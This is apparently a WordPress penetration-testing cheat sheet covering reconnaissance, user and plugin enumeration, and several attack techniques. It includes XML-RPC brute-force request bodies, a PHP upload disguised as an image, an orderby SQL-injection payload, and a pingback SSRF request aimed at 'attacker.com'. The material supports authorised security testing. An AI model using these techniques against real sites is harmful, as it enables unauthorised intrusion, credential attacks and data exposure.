# WordPress Security Testing

## Overview
Security testing methodology for WordPress installations including core, plugins, themes, and configuration.

## Reconnaissance
```
# Detect WordPress
curl -s https://target.com/ | grep -i "wp-content\|wp-includes\|wordpress"
whatweb target.com

# Version detection
curl -s https://target.com/readme.html
curl -s https://target.com/wp-includes/version.php
curl -s "https://target.com/?v=" | grep "generator"
<meta name="generator" content="WordPress 6.x">

# Enumerate users
https://target.com/?author=1 → redirects to /author/username
https://target.com/wp-json/wp/v2/users → JSON user list (if public)
curl https://target.com/wp-json/wp/v2/users

# WPScan
wpscan --url https://target.com --enumerate u,p,t --api-token TOKEN
```

## Authentication
```
# Default login URL
/wp-login.php, /wp-admin/, /login, /admin

# XML-RPC brute force (often less protected)
POST /xmlrpc.php
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param>
<param><value>password</value></param></params></methodCall>

# Multicall brute force via XML-RPC:
system.multicall with hundreds of login attempts in one request

# Disable XML-RPC check:
curl -s https://target.com/xmlrpc.php
# 405 or 403 = disabled, 200 = enabled
```

## Plugin Vulnerabilities
```
# Enumerate installed plugins
curl -s https://target.com/wp-content/plugins/
# Check readme.txt for version:
curl -s https://target.com/wp-content/plugins/PLUGIN_NAME/readme.txt

# Common vulnerable plugins (check CVE DB for current):
# File Manager, Duplicator, Contact Form 7, WooCommerce
# Ninja Forms, Elementor, WPForms, Yoast SEO

# CVE search
site:cve.mitre.org "wordpress plugin PLUGIN_NAME"
wpscan --url target.com --enumerate p --plugins-detection aggressive
```

## Theme Vulnerabilities
```
# Enumerate themes
curl -s https://target.com/wp-content/themes/
# Check style.css for version
curl -s https://target.com/wp-content/themes/THEME/style.css

# Common theme vulnerabilities: LFI, XSS, CSRF, SQLi
```

## Core Vulnerabilities
```
# Check WordPress version against known CVEs
# /wp-includes/version.php
# WordPress security advisories: wordpress.org/news/category/security/
```

## Information Disclosure
```
# Debug mode: wp-config.php with WP_DEBUG=true
# Exposed wp-config.php backup:
/wp-config.php.bak, /wp-config.bak, /wp-config~, /.wp-config.php.swp

# Server info disclosure
/wp-cron.php — cron script (may reveal timing)
/license.txt — version disclosure
/readme.html — version disclosure

# Debug log exposure
/wp-content/debug.log

# phpinfo via WP
/wp-content/plugins/phpinfo/
```

## File Upload via Media
```
# Admin → Media → Add New
# Upload PHP disguised as image
# Content-Type: image/jpeg with .php extension

# WordPress may allow certain MIME types
# SVG upload → XSS
# XML/XLST → XXE
```

## REST API Attacks
```
# Unauthenticated access
GET /wp-json/wp/v2/users → user enumeration
GET /wp-json/wp/v2/posts → post content
GET /wp-json/wp/v2/media → media files

# Create posts/pages (if author permissions)
POST /wp-json/wp/v2/posts
Authorization: Basic base64(user:pass)

# Disable REST API check:
curl https://target.com/wp-json/
```

## SQL Injection via WP
```
# orderby parameter in search
?s=test&orderby=rand() -- -

# WP plugin SQLi (many plugins have vulnerable query params)
# Check each plugin's parameters for SQLi
```

## SSRF via WordPress
```
# WordPress pingback feature
POST /xmlrpc.php
<methodCall><methodName>pingback.ping</methodName>
<params><param><value>http://attacker.com/</value></param>
<param><value>https://target.com/some-post/</value></param></params></methodCall>

# WordPress autodiscovery feature
# fetch_feed() — SSRF potential if URL is user-controlled
```

## Privilege Escalation
```
# Register as subscriber → escalate to admin
# User role manipulation via user meta
# wp_capabilities meta field
# IDOR in user profile update
```

## Testing Methodology
1. Run wpscan for comprehensive enumeration
2. Check WordPress version vs CVE database
3. Enumerate users (author scan, REST API)
4. Test authentication (brute force, XML-RPC)
5. Identify all installed plugins and themes
6. Check plugin/theme versions vs CVE database
7. Test REST API endpoints
8. Check for information disclosure files
9. Test file upload functionality
10. Check XML-RPC pingback for SSRF

## Tools
- `wpscan` — WordPress scanner
- `wp-cli` — WordPress CLI (if server access)
- Burp Suite for manual testing
- `nuclei -t wordpress/` templates
